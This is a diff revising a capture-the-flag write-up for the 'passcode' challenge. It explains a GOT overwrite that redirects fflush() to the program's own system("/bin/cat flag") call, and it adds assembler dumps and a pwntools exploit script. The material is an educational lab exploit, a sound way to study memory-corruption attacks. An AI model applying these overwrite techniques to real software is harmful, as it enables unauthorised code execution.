@@ -264,11 +264,12 @@ So, we can overwrite the location at which `scanf()` will read our input for the
 
 This opens up and exploit path for us.
 
-If we look at the code, we can see that it calls `system()` in order to `cat` out the flag.
+If we look at the code, we can see that it calls `system()` in order to `cat` out the flag. Before that it sets both the real group ID and effective group ID to the current effective group ID.
 
 ```c title="passcode.c"
 # --- snip ---
 
+        setregid(getegid(), getegid());
         system("/bin/cat flag");
 
 # --- snip ---
@@ -282,6 +283,16 @@ Dump of assembler code for function login:
 
 # --- snip ---
 
+   0x0804929e <+168>:	add    esp,0x10
+   0x080492a1 <+171>:	call   0x8049080 <getegid@plt>
+   0x080492a6 <+176>:	mov    esi,eax
+   0x080492a8 <+178>:	call   0x8049080 <getegid@plt>
+   0x080492ad <+183>:	sub    esp,0x8
+   0x080492b0 <+186>:	push   esi
+   0x080492b1 <+187>:	push   eax
+   0x080492b2 <+188>:	call   0x80490c0 <setregid@plt>
+   0x080492b7 <+193>:	add    esp,0x10
+   0x080492ba <+196>:	sub    esp,0xc
    0x080492bd <+199>:	lea    eax,[ebx-0x1fb9]
    0x080492c3 <+205>:	push   eax
    0x080492c4 <+206>:	call   0x80490a0 <system@plt>
@@ -291,7 +302,7 @@ Dump of assembler code for function login:
 End of assembler dump.
 ```
 
-We can see that the address of the `system()` setup is `0x080492bd`. 
+We can see that the address of the `system("/bin/cat flag");` setup is `0x0804929e`. 
 This is what we want to pass as input to `scanf()`.
 
 But we still haven't decided where we want to read this address.
@@ -335,20 +346,35 @@ Global Offset Table
                               │
 libc.so.6──────────────────┐  │
 │  ┌───────┐               │  │
-│  │fflush │◀─────────────────┘       
+│  │fflush │ <────────────────┘       
 │  └───────┘               │
 │  ┌───────┐               │  
-│  │system │               │  
+│  │printf │               │  
 │  └───────┘               │
 │                          │
 │   ......                 │
 │                          │
-└──────────────────────────┘ 
+└──────────────────────────┘
+
+Commands:
+   0x0804929e <+168>:	add    esp,0x10
+   0x080492a1 <+171>:	call   0x8049080 <getegid@plt>
+   0x080492a6 <+176>:	mov    esi,eax
+   0x080492a8 <+178>:	call   0x8049080 <getegid@plt>
+   0x080492ad <+183>:	sub    esp,0x8
+   0x080492b0 <+186>:	push   esi
+   0x080492b1 <+187>:	push   eax
+   0x080492b2 <+188>:	call   0x80490c0 <setregid@plt>
+   0x080492b7 <+193>:	add    esp,0x10
+   0x080492ba <+196>:	sub    esp,0xc
+   0x080492bd <+199>:	lea    eax,[ebx-0x1fb9]
+   0x080492c3 <+205>:	push   eax
+   0x080492c4 <+206>:	call   0x80490a0 <system@plt>
 ```
 
-If we find the GOT address of `fflush()` and pass as the last 4 bytes in the `name` buffer, we can overwrite the GOT entry at the address of `fflush()` with the address of `system("/bin/cat flag");`.
+If we find the GOT address of `fflush()` and pass as the last 4 bytes in the `name` buffer, we can overwrite the GOT entry at the address of `fflush()` with the address of `system("/bin/cat flag");` setup.
 
-This will cause `system("/bin/cat flag");` to be executed when the program calls `fflush()`
+This will cause the setup of `system("/bin/cat flag");` to be executed when the program calls `fflush()`
 
 ```
 Global Offset Table      
@@ -368,12 +394,29 @@ libc.so.6──────────────────┐  │
 │  │fflush │               │  │
 │  └───────┘               │  │
 │  ┌───────┐               │  │
-│  │system │◀─────────────────┘   
-│  └───────┘               │
-│                          │
-│   ......                 │
-│                          │
-└──────────────────────────┘  
+│  │printf │               │  │
+│  └───────┘               │  │
+│                          │  │
+│   ......                 │  │
+│                          │  │
+└──────────────────────────┘  │
+                              │
+           ┌──────────────────┘
+           │
+Commands:  v
+   0x0804929e <+168>:	add    esp,0x10
+   0x080492a1 <+171>:	call   0x8049080 <getegid@plt>
+   0x080492a6 <+176>:	mov    esi,eax
+   0x080492a8 <+178>:	call   0x8049080 <getegid@plt>
+   0x080492ad <+183>:	sub    esp,0x8
+   0x080492b0 <+186>:	push   esi
+   0x080492b1 <+187>:	push   eax
+   0x080492b2 <+188>:	call   0x80490c0 <setregid@plt>
+   0x080492b7 <+193>:	add    esp,0x10
+   0x080492ba <+196>:	sub    esp,0xc
+   0x080492bd <+199>:	lea    eax,[ebx-0x1fb9]
+   0x080492c3 <+205>:	push   eax
+   0x080492c4 <+206>:	call   0x80490a0 <system@plt>
 ```
 
 Let's checkout the GOT for the challenge program.
@@ -408,9 +451,22 @@ Importantly, it also does not have any terminating bytes (`0x00`, `0x0a`, `0x09`
 
 We have all the requirements to craft a successfull exploit.
 	- [x] Number padding bytes: `96`
-	- [x] GOT address of `func()`: `0x0804c014`
- 	- [x] Address of `system("/bin/cat flag");` setup: `0x080492bd`. We have to pass this as a decimal.
+	- [x] GOT address of `fflush()`: `0x0804c014`
+ 	- [x] Address of `system("/bin/cat flag");` setup: `0x0804929e`. We have to pass this as a decimal.
 
+```python title="/tmp/passcode.py"
+from pwn import *
+
+padding = b"A" * 96
+fflush_addr = p32(0x0804c014)
+got_overwrite_payload = padding + fflush_addr
+
+p = process("/home/passcode/passcode")
+p.sendline(got_overwrite_payload)
+
+system_addr = str(0x0804929e)
+
+p.sendline(system_addr)
+print(p.recvall())
 ```
-python -c "print('a'*96 + '\x14\xc0\x04\x08' + '134517437')" | ./passcode
-```
+
